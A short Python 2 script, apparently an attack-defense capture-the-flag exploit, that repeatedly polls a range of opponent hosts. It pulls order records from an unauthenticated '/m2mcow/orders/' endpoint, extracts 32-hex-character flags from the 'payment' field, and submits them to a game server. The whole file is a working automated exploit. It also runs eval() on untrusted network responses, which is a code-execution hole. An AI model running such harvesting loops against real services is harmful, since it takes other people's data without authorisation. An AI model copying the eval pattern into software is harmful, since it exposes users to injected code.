#! /usr/bin/env python
import socket
import os, sys 
import urllib, urllib2
import re
import time

def submit(*args,**kwargs):
        TEAMIP = '10.0.17.3'
        GAMESERVER = '10.0.3.3'
        PORT = 31337
        for flag in args:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((GAMESERVER, PORT))
                msg = s.recv(1024)
                print msg
                s.send('7\n')
                #s.send(TEAMIP+'\n')
                msg = s.recv(1024)
                print msg
                s.send(flag+'\n')
                print s.recv(1024)

def http_request( url, values, method):
        #url = 'http://ww.something.de'
        #values = {'id':'value'}
        #method = 'GET' or 'POST'
        data = urllib.urlencode( values )
        if method == 'GET':
                url = url + '?' + data
                req = urllib2.Request( url )
        if method == 'POST':
                req = urllib2.Request( url, data )
        response = urllib2.urlopen( req )
        return response.read()

# Port zum submitte

# Hosts to exploit
HOSTS = [ '10.0.{}.3'.format(i) for i in range(11, 23) ]

class Exploiter(object):
    def run(self):
        for host in HOSTS:
            try:
                reply=http_request('http://{}:4221/m2mcow/orders/'.format(host),{},'GET')
                match=re.findall(r'[-a-f0-9]+', reply)
                for m in match:
                    r = http_request('http://{}:4221/m2mcow/orders/{}'.format(host,m),{},'GET')
                    flag=eval(r)['payment']
                    if re.match(r'[a-f0-9]{32}',flag):
                        submit(flag)
                        time.sleep(1)
            except KeyboardInterrupt:
                exit(1)
            except:
                continue

e = Exploiter()
while True:
    e.run()
    time.sleep(60)
